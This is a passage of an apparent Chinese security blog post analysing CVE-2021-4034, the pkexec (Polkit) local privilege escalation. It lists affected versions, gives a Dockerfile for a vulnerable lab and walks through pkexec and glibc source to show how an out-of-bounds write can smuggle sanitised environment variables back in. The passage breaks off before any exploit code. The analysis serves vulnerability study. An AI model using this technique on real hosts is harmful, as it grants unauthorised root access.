<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.1">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-lu0k.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-lu0k.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-lu0k.png">
  <link rel="mask-icon" href="/images/lu0k.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"lu0k.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
<meta name="description" content="简介CVE-2021-4034是一个本地权限提升漏洞，该漏洞存在于Polkit工具包中的pkexec中。Polkit是一个用于定义和处理授权的工具包，用于允许非特权进程与特权进程对话。用户可以使用其中的pkexec以提升的权限执行命令。pkexec是一个SUID-root程序，如果成功利用此漏洞，任何非特权用户均可以在易受攻击的主机上获得root权限。">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-4034 分析及复现">
<meta property="og:url" content="https://lu0k.github.io/posts/cve-2021-4034/index.html">
<meta property="og:site_name" content="Lu0k">
<meta property="og:description" content="简介CVE-2021-4034是一个本地权限提升漏洞，该漏洞存在于Polkit工具包中的pkexec中。Polkit是一个用于定义和处理授权的工具包，用于允许非特权进程与特权进程对话。用户可以使用其中的pkexec以提升的权限执行命令。pkexec是一个SUID-root程序，如果成功利用此漏洞，任何非特权用户均可以在易受攻击的主机上获得root权限。">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-02-27T16:00:00.000Z">
<meta property="article:modified_time" content="2022-03-18T13:01:07.978Z">
<meta property="article:author" content="Lu0k">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://lu0k.github.io/posts/cve-2021-4034/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lu0k.github.io/posts/cve-2021-4034/","path":"posts/cve-2021-4034/","title":"CVE-2021-4034 分析及复现"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>CVE-2021-4034 分析及复现 | Lu0k</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Lu0k</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Lu0k's Blog</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-number">2.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">成因分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">利用分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">6.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Lu0k"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Lu0k</p>
  <div class="site-description" itemprop="description">谦虚学习!</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">162</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/lu0k" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lu0k" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/Lu0kMe" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Lu0kMe" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



          </div>
        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lu0k.github.io/posts/cve-2021-4034/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Lu0k">
      <meta itemprop="description" content="谦虚学习!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lu0k">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE-2021-4034 分析及复现
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-02-28 00:00:00" itemprop="dateCreated datePublished" datetime="2022-02-28T00:00:00+08:00">2022-02-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Vulns/" itemprop="url" rel="index"><span itemprop="name">Vulns</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>CVE-2021-4034是一个本地权限提升漏洞，该漏洞存在于<code>Polkit</code>工具包中的<code>pkexec</code>中。<code>Polkit</code>是一个用于定义和处理授权的工具包，用于允许非特权进程与特权进程对话。用户可以使用其中的<code>pkexec</code>以提升的权限执行命令。<code>pkexec</code>是一个<code>SUID-root</code>程序，如果成功利用此漏洞，任何非特权用户均可以在易受攻击的主机上获得<code>root</code>权限。</p>
<span id="more"></span>

<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>2021年内所有自带<code>pkexec</code>的发行版。部分发行版中存在漏洞的<code>Polkit(policykit)</code>程序版本如下：</p>
<table>
<thead>
<tr>
<th align="center">发行版</th>
<th align="center">存在漏洞的程序版本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Debian</td>
<td align="center">0.105-18+deb9u1及之前版本<br />0.105-25+deb10u1及之前版本<br />0.105-25+deb11u1及之前版本</td>
</tr>
<tr>
<td align="center">Ubuntu</td>
<td align="center">0.105-26ubuntu1.1及之前版本</td>
</tr>
<tr>
<td align="center">Arch Linux</td>
<td align="center">0.120-3及之前版本</td>
</tr>
<tr>
<td align="center">……</td>
<td align="center">……</td>
</tr>
</tbody></table>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用Docker搭建目标环境，<code>Polkit</code>版本为<code>0.105-26ubuntu1</code>，<code>Dockerfile</code>如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed -i <span class="string">&#x27;s/archive.ubuntu.com/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt update &amp;&amp; apt upgrade -y \</span></span><br><span class="line"><span class="bash">    &amp;&amp; DEBIAN_FRONTEND=noninteractive apt install -y \</span></span><br><span class="line"><span class="bash">    build-essential policykit-1=0.105-26ubuntu1 libpolkit-agent-1-0=0.105-26ubuntu1 libpolkit-gobject-1-0=0.105-26ubuntu1 \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt clean &amp;&amp; apt autoremove</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [ <span class="string">&quot;/bin/bash&quot;</span> ]</span></span><br></pre></td></tr></table></figure>

<p>使用如下命令构建镜像：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t cve-2021-4034 .</span><br></pre></td></tr></table></figure>

<h1 id="成因分析"><a href="#成因分析" class="headerlink" title="成因分析"></a>成因分析</h1><p>分析<code>0.120</code>版本的源代码，<a target="_blank" rel="noopener" href="https://www.freedesktop.org/software/polkit/releases/polkit-0.120.tar.gz">下载链接</a>。<code>pkexec.c</code>中的<code>main</code>函数的开头处理命令行参数，并在<code>PATH</code>环境变量的目录中搜索要执行的程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; (guint) argc; n++)</span><br><span class="line">    &#123;</span><br><span class="line">      ......</span><br><span class="line">      <span class="comment">// 处理命令行参数</span></span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">  g_assert (argv[argc] == <span class="literal">NULL</span>);</span><br><span class="line">  path = g_strdup (argv[n]);</span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">if</span> (path[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* g_find_program_in_path() is not suspectible to attacks via the environment */</span></span><br><span class="line">      s = g_find_program_in_path (path);</span><br><span class="line">      <span class="keyword">if</span> (s == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          g_printerr (<span class="string">&quot;Cannot run program %s: %s\n&quot;</span>, path, strerror (ENOENT));</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">      g_free (path);</span><br><span class="line">      argv[n] = path = s;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<p>如果运行<code>pkexec</code>时没有加任何参数，则：</p>
<ul>
<li><p><code>argv</code>列表为空，<code>n</code>将一直为1</p>
</li>
<li><p>由于<code>argv</code>列表为空，<code>path = g_strdup (argv[n])</code>将越界读取<code>argv[1]</code></p>
</li>
<li><p>若<code>path[0] != &#39;/&#39;</code>，<code>argv[n] = path = s</code>将指针<code>s</code>越界写入<code>argv[1]</code></p>
</li>
</ul>
<p>事实上，由于<code>argv</code>与<code>envp</code>指针在内存中是连续的，越界读取得到的是<code>envp[0]</code>，因此：</p>
<ul>
<li><code>path = g_strdup (argv[n])</code>将越界读取<code>envp[0]</code></li>
<li>读取得到的值被传递给<code>g_find_program_in_path</code>函数</li>
<li><code>g_find_program_in_path</code>函数在<code>PATH</code>环境变量的目录中搜索名为该值的可执行文件</li>
<li>如果找到该可执行文件，则将其完整路径赋值给<code>s</code></li>
<li>将该路径即<code>s</code>写入<code>envp[0]</code>，覆盖原来的值</li>
</ul>
<p>利用这种越界写入，可以将写入环境变量。例如，如果<code>PATH=asd=.</code>，并且目录<code>asd=.</code>存在且包含名为<code>envp[0]</code>值的可执行文件，则字符串<code>asd=./value</code>的指针将越界写入<code>envp[0]</code>。在<code>Linux</code>中，动态链接器会在运行特权程序前，清除敏感环境变量，如<code>LD_PRELOAD</code>。通过这种越界写入，我们可以将敏感环境变量重新写入<code>pkexec</code>的环境中，然后通过写入的敏感环境变量加载动态链接库，寻找触发点触发动态链接库中的函数即可实现命令执行。</p>
<p>继续查看源代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">saved_env = g_ptr_array_new ();</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; environment_variables_to_save[n] != <span class="literal">NULL</span>; n++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">const</span> gchar *key = environment_variables_to_save[n];</span><br><span class="line">    <span class="keyword">const</span> gchar *value;</span><br><span class="line"></span><br><span class="line">    value = g_getenv (key);</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* To qualify for the paranoia goldstar - we validate the value of each</span></span><br><span class="line"><span class="comment">     * environment variable passed through - this is to attempt to avoid</span></span><br><span class="line"><span class="comment">     * exploits in (potentially broken) programs launched via pkexec(1).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!validate_environment_variable (key, value))</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    g_ptr_array_add (saved_env, g_strdup (key));</span><br><span class="line">    g_ptr_array_add (saved_env, g_strdup (value));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>遍历<code>environment_variables_to_save</code>作为<code>key</code>并从环境变量中取值，<code>environment_variables_to_save</code>如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> gchar *environment_variables_to_save[] = &#123;</span><br><span class="line">    <span class="string">&quot;SHELL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LANG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LINGUAS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LANGUAGE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_COLLATE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_CTYPE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_MESSAGES&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_MONETARY&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_NUMERIC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_TIME&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_ALL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TERM&quot;</span>,</span><br><span class="line">    <span class="string">&quot;COLORTERM&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* By default we don&#x27;t allow running X11 apps, as it does not work in the</span></span><br><span class="line"><span class="comment">     * general case. See</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  https://bugs.freedesktop.org/show_bug.cgi?id=17970#c26</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * and surrounding comments for a lot of discussion about this.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * However, it can be enabled for some selected and tested legacy programs</span></span><br><span class="line"><span class="comment">     * which previously used e. g. gksu, by setting the</span></span><br><span class="line"><span class="comment">     * org.freedesktop.policykit.exec.allow_gui annotation to a nonempty value.</span></span><br><span class="line"><span class="comment">     * See https://bugs.freedesktop.org/show_bug.cgi?id=38769 for details.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="string">&quot;DISPLAY&quot;</span>,</span><br><span class="line">    <span class="string">&quot;XAUTHORITY&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>然后使用函数<code>validate_environment_variable</code>验证，该函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> gboolean</span></span><br><span class="line"><span class="function"><span class="title">validate_environment_variable</span> <span class="params">(<span class="keyword">const</span> gchar *key,</span></span></span><br><span class="line"><span class="params"><span class="function">                               <span class="keyword">const</span> gchar *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  gboolean ret;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Generally we bail if any environment variable value contains</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   *   - &#x27;/&#x27; characters</span></span><br><span class="line"><span class="comment">   *   - &#x27;%&#x27; characters</span></span><br><span class="line"><span class="comment">   *   - &#x27;..&#x27; substrings</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  g_return_val_if_fail (key != <span class="literal">NULL</span>, FALSE);</span><br><span class="line">  g_return_val_if_fail (value != <span class="literal">NULL</span>, FALSE);</span><br><span class="line"></span><br><span class="line">  ret = FALSE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* special case $SHELL */</span></span><br><span class="line">  <span class="keyword">if</span> (g_strcmp0 (key, <span class="string">&quot;SHELL&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* check if it&#x27;s in /etc/shells */</span></span><br><span class="line">      <span class="keyword">if</span> (!is_valid_shell (value))</span><br><span class="line">        &#123;</span><br><span class="line">          log_message (LOG_CRIT, TRUE,</span><br><span class="line">                       <span class="string">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class="line">          g_printerr (<span class="string">&quot;\n&quot;</span></span><br><span class="line">                      <span class="string">&quot;This incident has been reported.\n&quot;</span>);</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ((g_strcmp0 (key, <span class="string">&quot;XAUTHORITY&quot;</span>) != <span class="number">0</span> &amp;&amp; <span class="built_in">strstr</span> (value, <span class="string">&quot;/&quot;</span>) != <span class="literal">NULL</span>) ||</span><br><span class="line">           <span class="built_in">strstr</span> (value, <span class="string">&quot;%&quot;</span>) != <span class="literal">NULL</span> ||</span><br><span class="line">           <span class="built_in">strstr</span> (value, <span class="string">&quot;..&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      log_message (LOG_CRIT, TRUE,</span><br><span class="line">                   <span class="string">&quot;The value for environment variable %s contains suscipious content&quot;</span>,</span><br><span class="line">                   key);</span><br><span class="line">      g_printerr (<span class="string">&quot;\n&quot;</span></span><br><span class="line">                  <span class="string">&quot;This incident has been reported.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ret = TRUE;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数调用函数<code>g_printerr</code>，<code>g_printerr</code>函数是<code>GLIB</code>库中的函数，调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">g_printerr()                    glib/gmessages.c <span class="number">3420</span></span><br><span class="line">strdup_convert()                glib/gmessages.c <span class="number">1041</span></span><br><span class="line">g_convert_with_fallback()       glib/gconvert.c   <span class="number">643</span></span><br><span class="line">g_convert()                     glib/gconvert.c   <span class="number">557</span></span><br><span class="line">open_converter()                glib/gconvert.c   <span class="number">307</span></span><br><span class="line">g_iconv_open()                  glib/gconvert.c   <span class="number">214</span></span><br><span class="line">try_conversion()                glib/gconvert.c   <span class="number">166</span></span><br><span class="line">iconv_open()</span><br></pre></td></tr></table></figure>

<p><code>iconv_open()</code>是一个为字符集转换分配描述符的函数，其源代码位于<code>glibc/iconv/iconv_open.c</code>，源代码如下<code>(Glibc-2.35)</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">iconv_t</span></span></span><br><span class="line"><span class="function"><span class="title">iconv_open</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *tocode, <span class="keyword">const</span> <span class="keyword">char</span> *fromcode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__gconv_t</span> cd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">gconv_spec</span> <span class="title">conv_spec</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__gconv_create_spec (&amp;conv_spec, fromcode, tocode) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">iconv_t</span>) <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> res = __gconv_open (&amp;conv_spec, &amp;cd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  __gconv_destroy_spec (&amp;conv_spec);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (res, __GCONV_OK) != __GCONV_OK)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We must set the error number according to the specs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (res == __GCONV_NOCONV || res == __GCONV_NODB)</span><br><span class="line">	__set_errno (EINVAL);</span><br><span class="line"></span><br><span class="line">      cd = (<span class="keyword">iconv_t</span>) <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">iconv_t</span>) cd;</span><br><span 